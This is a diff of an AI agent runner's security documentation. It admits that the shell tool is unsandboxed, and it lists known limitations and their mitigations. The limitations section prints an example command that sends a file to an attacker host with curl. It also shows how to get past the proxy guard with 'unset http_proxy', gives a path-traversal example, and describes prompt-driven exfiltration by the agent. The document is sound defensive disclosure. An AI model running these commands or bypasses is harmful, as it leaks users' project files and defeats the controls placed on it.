@@ -29,7 +29,7 @@ in the Claude Local Bridge Output log. That token is a local debug door code, no
 | **Write**         | `edit_file`, `write_file`                                                   | Any file inside `cwd` that passes the deny matrix. Backups saved before mutation. Requires user confirmation (or `--accept-edits`).                                                                                                                                                                                                                                 |
 | **Recovery**      | `undo`, `undo_edit`                                                         | Restore files from `.bridge-runner/backups/` or the in-memory undo log. Auto-approved.                                                                                                                                                                                                                                                                              |
 | **Advanced**      | `apply_patch`                                                               | **Quarantined.** Still registered for a future repair, but never offered and every execute path refuses. Unsafe shell interpolation and incomplete hunk/rollback semantics remain; use `edit_file` / `write_file` instead. Naming it in `--tools` does not re-enable it.                                                                                                                                                            |
-| **Shell**         | `bash`, `manage_shell_jobs`                                                 | Run shell commands inside `cwd`. **Opt-in only** (`--allow-shell`). Synchronous `bash` is bounded by timeout (default 30s) and output limits (10KB). `manage_shell_jobs` runs background commands (max 8 per run) with poll/kill; same shell-policy scanner applies. Filtered environment. Shell argument scanning blocks dangerous path references.                |
+| **Shell**         | `bash`, `manage_shell_jobs`                                                 | **Opt-in only** (`--allow-shell`). Unsandboxed **local-account authority**: the process starts in `--cwd`, but commands are **not** cwd-confined — absolute/parent paths, process spawn, and network remain possible. Timeout (default 30s) and output caps apply. Regex shell-policy scanning blocks some sensitive path/env patterns as defense-in-depth. `--no-network` is a best-effort proxy env guard, **not** hard network isolation. |
 
 ## Retired profile loaders
 
@@ -224,7 +224,20 @@ Exec hooks are **user-configured**, not model-callable. The model cannot add or 
 
 ## Known limitations
 
-### 1. No hard outbound network restriction (mitigated)
+### 1. Shell is unsandboxed local-account authority (documented honesty)
+
+Enabling `--allow-shell` exposes `bash` / `manage_shell_jobs` with the same OS account rights as the runner process.
+The shell process **starts** in `--cwd`, but that is a starting directory only — not a jail. Commands can read absolute
+and parent paths that are not caught by the regex deny list, spawn other processes, and reach the network.
+
+**Mitigation in place:** Shell stays hidden unless explicitly enabled. Interactive confirmation shows the proposed
+command plus an honesty line. Regex scanning blocks some sensitive path and credential-env patterns. Timeout and
+output caps limit runaway commands.
+
+**Remaining risk:** Portable OS isolation (containers, Seatbelt, Landlock, etc.) is a separate project. Do not treat
+regex scanning or `--no-network` as a sandbox.
+
+### 2. No hard outbound network restriction (mitigated)
 
 The `bash` tool can make outbound HTTP requests (`curl`, `wget`, `nc`). There is no egress filtering at the socket or process level. A determined prompt could exfiltrate project files via `curl -d @secret.txt https://attacker.com`.
 
@@ -232,19 +245,19 @@ The `bash` tool can make outbound HTTP requests (`curl`, `wget`, `nc`). There is
 
 **Remaining risk:** The proxy env vars can be unset by the command itself (`unset http_proxy && curl ...`). Non-HTTP protocols (DNS, raw TCP via `nc`, `ncat`) are not affected by proxy settings at all. For strong isolation, use macOS `pf` firewall rules (`/etc/pf.conf`) or run the runner inside a network-restricted VM/container.
 
-### 2. File size hard cap
+### 3. File size hard cap
 
 `read_file` has configurable `max_bytes`/`max_lines` defaults (50KB/1000 lines), but the model can override them. A hard cap of 1MB (`MAX_BYTES_HARD_CAP`) is now enforced server-side. Requests exceeding this cap are truncated.
 
-### 3. Shell output size hard cap
+### 4. Shell output size hard cap
 
 `bash` tool output is now truncated at 100,000 characters (100KB). The `execSync`/`spawnSync` buffer is capped at 1MB. Stderr is captured and prefixed with `[stderr]` on success.
 
-### 4. No rate limiting on tool calls
+### 5. No rate limiting on tool calls
 
 The model can make unlimited tool calls within `max_steps`. There's no per-second or per-minute rate limit on shell commands.
 
-### 5. Transcript contains source code
+### 6. Transcript contains source code
 
 Transcript JSONL files include tool results (file contents, shell output). These contain project source code. Treat transcripts as sensitive.
 
@@ -253,20 +266,20 @@ permission decisions, usage counters, response statuses, and header names. `reda
 scrubbed prompt bodies, model payloads, tool inputs, tool results, and upstream response previews. Treat those trace
 files as sensitive local evidence even though authorization and key-looking fields are redacted.
 
-### 6. Command injection in search_text (mitigated)
+### 7. Command injection in search_text (mitigated)
 
 The `search_text` tool constructs shell commands from the user's pattern. Shell metacharacters are now properly escaped using single-quote wrapping with internal quote escaping.
 
-### 7. undo/undo_edit/apply_patch path validation (mitigated / quarantined)
+### 8. undo/undo_edit/apply_patch path validation (mitigated / quarantined)
 
 `undo` and `undo_edit` validate paths through `safety.confinePath()` before operating. This prevents path traversal attacks (e.g., `--path ../../../etc/passwd`).
 
 `apply_patch` is **quarantined** (P0-06): it is never offered and every execute path refuses until argv-based execution, atomic writes, full hunk validation, and rollback are implemented. Path validation alone was not sufficient because the tool still used shell interpolation.
 
-### 7b. search_text deny-matrix parity (mitigated)
+### 8b. search_text deny-matrix parity (mitigated)
 
 `search_text` applies `safety.isFileCandidateAllowed` (realpath confinement + deny matrix) to every candidate before contents can reach the model, across ripgrep, grep, and Node walk backends. Symlink aliases that escape `--cwd` or land on denied files are skipped.
 
-### 8. write_file content validation (mitigated)
+### 9. write_file content validation (mitigated)
 
 `write_file` now validates that `content` is a string and the path passes `confinePath()`. Missing content returns an error instead of crashing.
